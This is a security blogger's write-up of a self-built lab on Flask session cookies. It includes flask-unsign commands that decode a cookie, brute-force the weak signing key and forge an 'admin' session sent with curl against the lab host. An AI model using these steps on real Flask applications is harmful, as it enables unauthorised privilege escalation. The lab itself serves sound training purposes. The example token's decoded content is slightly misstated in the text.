
Cracked Flask Lab

##
#
https://digi.ninja/blog/cracked_flask.php
#
https://flask.palletsprojects.com/en/2.0.x/
#
https://book.jorianwoltjer.com/languages/web-frameworks/flask
#
https://jacobpadilla.com/articles/python-flask-login-system
#
##

    Home
    Blog
    Cracked Flask Lab

Thurs 9th Dec 21

As with all my labs, this one started on a test. The app was written in Python Flask and used its default session manager.

The session manager stores all the session information on the client side, so as well as being able to see what is being stored about you, there is also the potential to modify it, the only small problem, it is protected by a HMAC.

The format of the token is similar to a JWT, but in this order:

base64(JSON session data) . encoded timestamp . HMAC

Here is an example:

eyJoZWxsbyI6IndvcmxkMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ . YbDIxQ . lvkY_D2TEqYp17FdMdgDLOaQNaA

The session data here decodes to:

{
  'hello': 'world',
  'username': 'robin'
}

Generating the HMAC requires a secret key, if you can recover, or crack, the key, then you are able to make any changes you want to the session information. In the app I was testing, this would allow me to elevate my privileges from normal user to administrator.

Rather than hammer the client's site to learn about how all this worked, and more importantly, how to crack the key, I built my Cracked Flask lab.

The lab is very simple, when you first view the page, it sets a session cookie which contains the same information as shown above, to elevate your privileges to administrator, all you have to do is to change the username to "admin".

There are quite a few tools out there that will help with the challenge, but the one I settled on was Flask Unsign. It is really easy to use and managed a brute force crack of the key very quickly.

I've included a walk through of how I used Flask Unsign to crack the lab key and then update it, but have a go at working it out yourself first.

Access the Cracked Flask Lab or view the GitHub Repo.
Walk Through

Pull down the cookie and have a look what is in it:

flask-unsign --decode --server https://crackedflask.digi.ninja/user

Try to crack it:

flask-unsign --unsign --server https://crackedflask.digi.ninja/user

Cracked it and got the secret key "monkey" so now create a new cookie with the username admin rather than robin:

flask-unsign --sign --secret monkey --cookie "{'hello': 'world2', 'username': 'admin'}"

Finally, make a request using the new cookie:

curl --cookie "session=eyJoZWxsbyI6IndvcmxkMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YbCXpA.45th8HQUFJO6GHycU_fMkPQ31qc" https://crackedflask.digi.ninja/user

If you want to combine the last two commands:

COOKIE=`flask-unsign --sign --secret monkey --cookie "{'hello': 'world2', 'username': 'admin'}"`
curl --cookie "session=$COOKIE" https://crackedflask.digi.ninja/user

Or you could just put the signing command into the curl command with backticks. Just watch the quotes if you try that:

curl --cookie "session=`flask-unsign --sign --secret monkey --cookie \"{'hello': 'world2', 'username': 'admin'}\"`" https://crackedflask.digi.ninja/user

If you just want to see it in action, here is a recording of these steps. 
